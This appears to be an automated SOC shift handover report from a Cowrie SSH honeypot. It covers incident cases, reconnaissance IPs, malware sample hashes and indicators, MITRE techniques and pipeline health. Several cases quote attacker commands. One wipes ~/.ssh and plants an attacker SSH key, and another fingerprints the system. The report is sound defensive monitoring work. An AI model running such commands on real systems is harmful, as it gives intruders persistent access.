**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 20:52:26` | `cowrie.session.connect` |
| `2026-07-04 20:52:26` | `cowrie.client.version` |
| `2026-07-04 20:52:26` | `cowrie.client.kex` |
| `2026-07-04 20:52:27` | `cowrie.login.success` |
| `2026-07-04 20:52:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `189.190.244[.]176` to AbuseIPDB if not already reported
- [ ] Block `189.190.244[.]176` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-39f25d2b0f77

| Field | Detail |
|---|---|
| **Source IP** | `189.190.244[.]176` |
| **First Seen** | 2026-07-04 20:52 |
| **Last Seen** | 2026-07-04 20:52 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 20:52:27` | `cowrie.session.connect` |
| `2026-07-04 20:52:27` | `cowrie.client.version` |
| `2026-07-04 20:52:27` | `cowrie.client.kex` |
| `2026-07-04 20:52:27` | `cowrie.login.success` |
| `2026-07-04 20:52:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `189.190.244[.]176` to AbuseIPDB if not already reported
- [ ] Block `189.190.244[.]176` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a38bda2fda9a

| Field | Detail |
|---|---|
| **Source IP** | `129.121.47[.]136` |
| **First Seen** | 2026-07-04 20:52 |
| **Last Seen** | 2026-07-04 20:52 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 20:52:47` | `cowrie.session.connect` |
| `2026-07-04 20:52:47` | `cowrie.client.version` |
| `2026-07-04 20:52:48` | `cowrie.client.kex` |
| `2026-07-04 20:52:48` | `cowrie.login.success` |
| `2026-07-04 20:52:49` | `cowrie.session.params` |
| `2026-07-04 20:52:49` | `cowrie.command.input` |
| `2026-07-04 20:52:49` | `cowrie.command.failed` |
| `2026-07-04 20:52:49` | `cowrie.log.closed` |
| `2026-07-04 20:52:50` | `cowrie.session.params` |
| `2026-07-04 20:52:50` | `cowrie.command.input` |
| `2026-07-04 20:52:50` | `cowrie.session.file_download` |
| `2026-07-04 20:52:50` | `cowrie.log.closed` |
| `2026-07-04 20:52:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.121.47[.]136` to AbuseIPDB if not already reported
- [ ] Block `129.121.47[.]136` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b2435c141b22

| Field | Detail |
|---|---|
| **Source IP** | `129.121.47[.]136` |
| **First Seen** | 2026-07-04 20:52 |
| **Last Seen** | 2026-07-04 20:52 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 20:52:50` | `cowrie.session.connect` |
| `2026-07-04 20:52:50` | `cowrie.client.version` |
| `2026-07-04 20:52:51` | `cowrie.client.kex` |
| `2026-07-04 20:52:51` | `cowrie.login.success` |
| `2026-07-04 20:52:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.121.47[.]136` to AbuseIPDB if not already reported
- [ ] Block `129.121.47[.]136` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a4bb13992eed

| Field | Detail |
|---|---|
| **Source IP** | `129.121.47[.]136` |
| **First Seen** | 2026-07-04 20:52 |
| **Last Seen** | 2026-07-04 20:52 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 20:52:51` | `cowrie.session.connect` |
| `2026-07-04 20:52:51` | `cowrie.client.version` |
| `2026-07-04 20:52:52` | `cowrie.client.kex` |
| `2026-07-04 20:52:52` | `cowrie.login.success` |
| `2026-07-04 20:52:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.121.47[.]136` to AbuseIPDB if not already reported
- [ ] Block `129.121.47[.]136` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-574634ccb007

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-07-04 20:54 |
| **Last Seen** | 2026-07-04 20:54 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 20:54:21` | `cowrie.session.connect` |
| `2026-07-04 20:54:21` | `cowrie.client.version` |
| `2026-07-04 20:54:21` | `cowrie.client.kex` |
| `2026-07-04 20:54:24` | `cowrie.login.success` |
| `2026-07-04 20:54:26` | `cowrie.session.params` |
| `2026-07-04 20:54:26` | `cowrie.command.input` |
| `2026-07-04 20:54:26` | `cowrie.command.input` |
| `2026-07-04 20:54:26` | `cowrie.command.input` |
| `2026-07-04 20:54:26` | `cowrie.command.input` |
| `2026-07-04 20:54:26` | `cowrie.command.input` |
| `2026-07-04 20:54:26` | `cowrie.command.success` |
| `2026-07-04 20:54:26` | `cowrie.command.input` |
| `2026-07-04 20:54:26` | `cowrie.command.input` |
| `2026-07-04 20:54:26` | `cowrie.command.input` |
| `2026-07-04 20:54:26` | `cowrie.command.input` |
| `2026-07-04 20:54:26` | `cowrie.log.closed` |
| `2026-07-04 20:54:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `206.81.2[.]201` | **129** | 2026-07-04 18:55 | 2026-07-04 20:55 | 77m | 0 | `T1592` | 🟠 MEDIUM |
| `104.218.164[.]192` | **5** | 2026-07-04 19:19 | 2026-07-04 19:21 | 1m | 0 | `T1592` | 🟢 LOW |
| `107.150.146[.]69` | **5** | 2026-07-04 19:04 | 2026-07-04 20:10 | 2m | 0 | `T1592` | 🟢 LOW |
| `66.132.186[.]181` | **5** | 2026-07-04 19:10 | 2026-07-04 19:11 | 0m | 0 | `T1592` | 🟢 LOW |
| `52.142.44[.]95` | **3** | 2026-07-04 20:35 | 2026-07-04 20:54 | 3m | 0 | `T1592` | 🟢 LOW |
| `66.132.172[.]198` | **3** | 2026-07-04 20:28 | 2026-07-04 20:29 | 0m | 0 | `T1592` | 🟢 LOW |
| `67.220.180[.]114` | **3** | 2026-07-04 18:55 | 2026-07-04 20:53 | 2m | 0 | `T1592` | 🟢 LOW |
| `172.202.118[.]67` | **2** | 2026-07-04 20:30 | 2026-07-04 20:30 | 0m | 0 | `T1592` | 🟢 LOW |
| `195.178.110[.]228` | **2** | 2026-07-04 20:33 | 2026-07-04 20:50 | 0m | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `210.16.100[.]120` | **2** | 2026-07-04 19:54 | 2026-07-04 20:07 | 1m | 0 | `T1592` | 🟢 LOW |
| `219.151.148[.]162` | **2** | 2026-07-04 18:55 | 2026-07-04 18:57 | 2m | 0 | `T1592` | 🟢 LOW |
| `103.242.104[.]81` | 1 | 2026-07-04 20:02 | 2026-07-04 20:02 | 31s | 0 | `T1592` | 🟢 LOW |
| `107.173.85[.]94` | 1 | 2026-07-04 19:56 | 2026-07-04 19:56 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `111.20.172[.]234` | 1 | 2026-07-04 20:48 | 2026-07-04 20:48 | 2s | 0 | `T1592` | 🟢 LOW |
| `119.148.49[.]82` | 1 | 2026-07-04 19:06 | 2026-07-04 19:06 | 0s | 0 | `T1592` | 🟢 LOW |
| `123.193.148[.]214` | 1 | 2026-07-04 20:33 | 2026-07-04 20:34 | 30s | 0 | `T1592` | 🟢 LOW |
| `14.103.112[.]114` | 1 | 2026-07-04 19:57 | 2026-07-04 19:59 | 120s | 0 | `T1592` | 🟢 LOW |
| `14.103.116[.]192` | 1 | 2026-07-04 20:32 | 2026-07-04 20:34 | 120s | 0 | `T1592` | 🟢 LOW |
| `14.103.91[.]55` | 1 | 2026-07-04 20:31 | 2026-07-04 20:33 | 120s | 0 | `T1592` | 🟢 LOW |
| `196.204.71[.]189` | 1 | 2026-07-04 20:28 | 2026-07-04 20:28 | 0s | 0 | `T1592` | 🟢 LOW |
| `199.45.155[.]66` | 1 | 2026-07-04 20:17 | 2026-07-04 20:18 | 15s | 0 | `T1592` | 🟢 LOW |
| `218.203.203[.]232` | 1 | 2026-07-04 20:43 | 2026-07-04 20:44 | 0s | 0 | `T1592` | 🟢 LOW |
| `58.213.107[.]138` | 1 | 2026-07-04 19:50 | 2026-07-04 19:52 | 120s | 0 | `T1592` | 🟢 LOW |
| `60.188.249[.]64` | 1 | 2026-07-04 20:39 | 2026-07-04 20:40 | 8s | 0 | `T1592` | 🟢 LOW |
| `74.48.45[.]46` | 1 | 2026-07-04 19:16 | 2026-07-04 19:16 | 0s | 0 | `T1592` | 🟢 LOW |
| `77.90.185[.]16` | 1 | 2026-07-04 19:13 | 2026-07-04 19:13 | 0s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (49 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `00b374d5249b32ab298f86c2137962e6bf1f71e03c4db8e3ae169b601480d730` | Python Script | `00b374d5249b32ab...` | 66/100 | 🟡 MEDIUM | **17/74** 🔴 |
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/74 ✅ |
| `048e374baac36d8cf68dd32e48313ef8eb517d647548b1bf5f26d2d0e2e3cdc7` | ELF Binary (Linux executable) (x86 32-bit) | `048e374baac36d8c...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `16d3440fcc067823afc44dcbccea9fbbc2f8c68ae53b7aea45f9adff4c127086` | Bash Script | `16d3440fcc067823...` | 65/100 | 🟡 MEDIUM | **14/72** 🔴 |
| `197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` | Bash Script | `197c74408e15bd11...` | 68/100 | 🟡 MEDIUM | **22/75** 🔴 |
| `1ef0eb60318495dd0cb100fc828f28237d487b800605c7cc54155cf34582598b` | ELF Binary (Linux executable) (x86-64 64-bit) | `1ef0eb60318495dd...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `20260630-221457-3e8812e60d6c-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `21e99667e2f0e73d12aae89f8cabd338426ab1fe4ce828ec93c07de615ef754c` | ELF Binary (Linux executable) (AArch64 64-bit) | `21e99667e2f0e73d...` | 63/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `289fd4a7a10aaf8aa313ab80cc170018fc662d0a7d034a3b92b9d3d3945b0736` | ELF Binary (Linux executable) (x86-64 64-bit) | `289fd4a7a10aaf8a...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `2a39d592018600e4b3db2caed6cdaa8c651d3dacbebf8ac1f0960e493843c435` | ELF Binary (Linux executable) (x86-64 64-bit) | `2a39d592018600e4...` | 45/100 | 🟡 MEDIUM | **39/75** 🔴 |
| `2bd2ab1d4b75aa2b4eed1af697188b8bce35a882faf4335cb4fafc2847197995` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `2bd2ab1d4b75aa2b...` | 53/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `3552f719a379865960a169e2dacea968f4e8f46bd31907f2f89df431d09d9d9e` | ELF Binary (Linux executable) (x86-64 64-bit) | `3552f719a3798659...` | 46/100 | 🟡 MEDIUM | **40/74** 🔴 |
| `3625cfdcd6d434bfa672753ef4b197df8a01388d220bafc9edfa2d0d29c7fcef` | ELF Binary (Linux executable) (x86-64 64-bit) | `3625cfdcd6d434bf...` | 46/100 | 🟡 MEDIUM | **40/75** 🔴 |
| `3625d068896953595e75df328676a08bc071977ac1ff95d44b745bbcb7018c6f` | ELF Binary (Linux executable) (ARM 32-bit) | `3625d06889695359...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `3910f46fe809d723d169b5723e0724dba7aed441a065b53b98e2f1b0a9736569` | ELF Binary (Linux executable) (MIPS 32-bit) | `3910f46fe809d723...` | 62/100 | 🟡 MEDIUM | **31/74** 🔴 |
| `3ad48bae18b7ea8e7ffe3608b6eeaa4673b6ff47e9e6a21def774eecba66364a` | ELF Binary (Linux executable) (x86 32-bit) | `3ad48bae18b7ea8e...` | 80/100 | 🔴 HIGH | **26/74** 🔴 |
| `4481c88954298a5e5e0f0d70cd011644e8442e1aeb0ce42cc3c8b4d51a637f02` | ELF Binary (Linux executable) (ARM 32-bit) | `4481c88954298a5e...` | 51/100 | 🟡 MEDIUM | **28/74** 🔴 |
| `47b268c21591069bfe4099833ad66b8138a53ab2dcb866e040d466aee1f8624c` | ELF Binary (Linux executable) (x86-64 64-bit) | `47b268c21591069b...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `494ab0439cd9a373aca71bf5107e0718a9e14b9b805632835c99c42b88a50984` | ELF Binary (Linux executable) (x86 32-bit) | `494ab0439cd9a373...` | 51/100 | 🟡 MEDIUM | **28/74** 🔴 |
| `526c830542c17e6883da850de8dc2c3c2ffc35b446f33c61892b193e50f8d8ed` | ELF Binary (Linux executable) (x86-64 64-bit) | `526c830542c17e68...` | 52/100 | 🟡 MEDIUM | **32/74** 🔴 |
| `59691617d4c9bfe4a9202c318e632faa7c8a2d5dfdb46297e27c1a33971f3530` | ELF Binary (Linux executable) (unknown (e_machine=0x2a) 32-bit) | `59691617d4c9bfe4...` | 53/100 | 🟡 MEDIUM | **34/74** 🔴 |
| `59c29436755b0778e968d49feeae20ed65f5fa5e35f9f7965b8ed93420db91e5` | ELF Binary (Linux executable) (x86-64 64-bit) | `59c29436755b0778...` | 41/100 | 🟡 MEDIUM | **28/74** 🔴 |
| `629db57b96d6e965401d866f895d86c542efe344b3d489630a6ec09d643add76` | ELF Binary (Linux executable) (x86-64 64-bit) | `629db57b96d6e965...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `64b8416c418c265ee1a7999470d9f688ad8204c1d85341e270e23649ee21e11b` | Python Script | `64b8416c418c265e...` | 67/100 | 🟡 MEDIUM | **19/74** 🔴 |
| `6aa904125beb01924243b0dd04e0988b16b8bccd5479224f8bbcd762814b303e` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `6aa904125beb0192...` | 64/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `6d38d8be9058928878b583202c87b80fe8ff66b347e0d325a3c2b956094bfe7c` | ELF Binary (Linux executable) (MIPS 32-bit) | `6d38d8be90589288...` | 53/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `725d1de20672ed85f32e823fe067ed6eb17149019e146bafbbe59338df78e37f` | Bash Script | `725d1de20672ed85...` | 77/100 | 🔴 HIGH | **19/74** 🔴 |
| `75737a0d2987fb60d7a1f17ff2a7122132545e84a327e3a5372be51500a3be12` | ELF Binary (Linux executable) (x86-64 64-bit) | `75737a0d2987fb60...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `765289f938cc2bd64c9778dbabe048afa8ac3277a150c940d2730c14d24687b5` | ELF Binary (Linux executable) (x86-64 64-bit) | `765289f938cc2bd6...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `783adb7ad6b16fe9818f3e6d48b937c3ca1994ef24e50865282eeedeab7e0d59` | Bash Script | `783adb7ad6b16fe9...` | 61/100 | 🟡 MEDIUM | **28/75** 🔴 |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 46/100 | 🟡 MEDIUM | **40/73** 🔴 |
| `7b61a0032297d2b400d3dd5e69556a8ca31adb717464c247aaf997f4b4de26f6` | Unknown binary | `7b61a0032297d2b4...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `80c3fe2ae1062abf56456f52518bd670f9ec3917b7f85e152b347ac6b6faf880` | Unknown binary | `80c3fe2ae1062abf...` | 0/100 | 🟢 LOW | 0/74 ✅ |
| `80e404f6a1b7c29380ce6a82ed5379e81b3bd50f9ddfde1ab6a849d30959a3d4` | ELF Binary (Linux executable) (unknown (e_machine=0x14) 32-bit) | `80e404f6a1b7c293...` | 53/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `84fac1d9c9d83182fa6428365907f7fbeb4c621eb7eb2b2a0140fdcd245b20e9` | ELF Binary (Linux executable) (x86-64 64-bit) | `84fac1d9c9d83182...` | 45/100 | 🟡 MEDIUM | **40/76** 🔴 |
| `88d028a54a136782982817d1d93c89b075b7f04897b0c0681311add7c8712eb6` | ELF Binary (Linux executable) (x86-64 64-bit) | `88d028a54a136782...` | 87/100 | 🔴 HIGH | **43/74** 🔴 |
| `8e7395ed4110a27c717f63cd7e039b19939c87c9283710108ebc38946f4fbf98` | Shell Script | `8e7395ed4110a27c...` | 62/100 | 🟡 MEDIUM | **6/75** 🔴 |
| `938d5d3054da170715410084aef8fc7d029a4adf6e622b4245619ec0cc3bddf2` | ELF Binary (Linux executable) (MIPS 32-bit) | `938d5d3054da1707...` | 52/100 | 🟡 MEDIUM | **31/74** 🔴 |
| `93e71b122a432c2b7acf6a5db6ee3e42e792ef240acee466c4310b052e2416db` | Shell Script | `93e71b122a432c2b...` | 62/100 | 🟡 MEDIUM | **31/73** 🔴 |
| `9646ec7df450cf35e898623f8eb1dd3fe66569730156d0bb055d04ebb5272afc` | Unknown binary | `9646ec7df450cf35...` | 55/100 | 🟡 MEDIUM | **40/76** 🔴 |
| `97a1e6f817d44a4f8b07fdebaf9357786742096c470eb5d78e789b6bb53979bb` | ELF Binary (Linux executable) (x86-64 64-bit) | `97a1e6f817d44a4f...` | 42/100 | 🟡 MEDIUM | **30/73** 🔴 |
| `a2f3d6d2bd82a65939f4e939bce242e8e246014fb3a9a9d5c3769ed7dcfffe24` | Unknown binary | `a2f3d6d2bd82a659...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `a6fbbdec757b0fe91ea18dc3d9f7b379c18ca49eeef63afaea8da3c9385b1049` | ELF Binary (Linux executable) (x86-64 64-bit) | `a6fbbdec757b0fe9...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 12/100 | 🟢 LOW | **32/74** 🔴 |
| `b1633346a694467b99d9596fe36d0cc88ff1f82f8e86f1c53d3218de1839a43e` | Python Script | `b1633346a694467b...` | 62/100 | 🟡 MEDIUM | **7/75** 🔴 |
| `b1e4374da060cb4bf9ff872f3e060486d9cd400519e0b2823f61670d64148ab4` | ELF Binary (Linux executable) (x86-64 64-bit) | `b1e4374da060cb4b...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |

**Suspicious Indicators — HIGH Severity Samples:**

_`3ad48bae18b7ea8e7ffe3608b6eeaa4673b6ff47e9e6a21def774eecba66364a` (3ad48bae18b7ea8e7ffe3608...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`725d1de20672ed85f32e823fe067ed6eb17149019e146bafbbe59338df78e37f` (725d1de20672ed85f32e823f...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `chmod +x (make executable)` — `chmod +x`
- `IP:Port (possible C2)` — `51.158.248[.]122:8517`

_`88d028a54a136782982817d1d93c89b075b7f04897b0c0681311add7c8712eb6` (88d028a54a136782982817d1...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `140.245.50[.]204` | SG | Oracle Corporation | **100** ⚠️ | 1 |
| `64.110.90[.]250` | KR | Oracle Corporation | **100** ⚠️ | 4 |
| `129.153.145[.]135` | US | Oracle Corporation | **100** ⚠️ | 8 |
| `210.16.100[.]120` | US | Psychz Networks | **100** ⚠️ | 7 |
| `206.81.2[.]201` | US | DigitalOcean, LLC | **100** ⚠️ | 9 |
| `176.53.159[.]196` | PL | BearShield Technologies S.R.O. | **100** ⚠️ | 11 |
| `67.220.180[.]114` | US | Host World Net LLC | **100** ⚠️ | 19 |
| `119.148.49[.]82` | BD | Agni Systems Limited, | **100** ⚠️ | 50 |
| `14.103.116[.]192` | CN | Beijing Volcano Engine Technology Co., Ltd. | **100** ⚠️ | 50 |
| `66.132.172[.]198` | US | Censys, Inc. | **100** ⚠️ | 50 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 221 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 213 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 7 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 6 |
| [T1083](https://attack.mitre.org/techniques/T1083) | 3 |

---

## 🔕 False Positive Summary (72 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 3 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 69 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 461 cases |
| Tool 34  | Credential Extractor        | ✅ 219 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 11 fingerprints |
| Tool 36  | Command Clustering          | ✅ 8 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 44 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 72 filtered (15.6%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 32 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 49 files |
| Tool 33  | YARA Classifier             | ✅ 36 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 213 priority case(s) shown individually · 26 recon entry/entries in table (11 group(s) consolidating 161 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

## 🛡️ CIS Controls Snapshot

| Control | Name | Status | Evidence |
|---|---|---|---|
| CIS-1 | Asset Inventory | ACTIVE | assets.json updated every pipeline run by Tool 05 — covers VM2 directly and VM1 via SSH relay |
| CIS-2 | Software Inventory | MONITORING | data/tool_manifest.json auto-generated from pipeline.yml each run — tracks all active tools, languages, and I/O paths |
| CIS-3 | Data Protection | ACTIVE | R2 archive encrypted at rest — thirha-raw-archive |
| CIS-4 | Secure Configuration | ACTIVE | haproxy.cfg, cowrie.cfg, VCN rules in config/ |
| CIS-5 | Account Management | ACTIVE | Two key pairs, dedicated cowrie user, no shared credentials |
| CIS-6 | Access Control | ACTIVE | Pipeline key vs personal key separation, GitHub Secrets |
| CIS-7 | Vulnerability Management | MONITORING | Oracle security patches — pending regular cadence |
| CIS-8 | Audit Log Management | ACTIVE | cowrie.json + cowrie.log dual streams, 59-day corpus |
| CIS-9 | Email/Web Protection | PLANNED | cloudflared tunnels planned — direct IP exposure currently |
| CIS-10 | Malware Defence | ACTIVE | Tool 31 malware analysis + Tool 33 YARA classification |
| CIS-11 | Data Recovery | ACTIVE | R2 archive, EBS snapshots, runbook recovery procedures |
| CIS-12 | Network Infrastructure | ACTIVE | VCN private networking, HAProxy TCP LB, Cloudflare DNS |

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `Aegispub/thir-ha · Oracle Cloud HA_  
_Report time: 2026-07-04T21:02:54Z_
